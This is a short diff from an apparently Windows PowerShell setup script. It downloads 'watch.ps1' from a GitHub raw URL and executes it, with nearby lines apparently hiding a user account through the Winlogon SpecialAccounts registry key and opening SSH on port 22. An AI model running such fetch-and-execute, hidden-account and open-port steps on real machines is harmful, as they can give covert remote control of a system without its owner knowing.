@@ -19,7 +19,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccou
 
 mkdir $env:Temp/$temp_dir
 Invoke-WebRequest 'raw.githubusercontent.com/DomoKrch/experiments/main/watch.ps1' -OutFile $env:Temp/$temp_dir/watch.ps1
-./$env:Temp/$temp_dir/watch.ps1
+& $env:Temp/$temp_dir/watch.ps1
 
 
 # Open SSH and port 22 (add a rule in firewall as well)
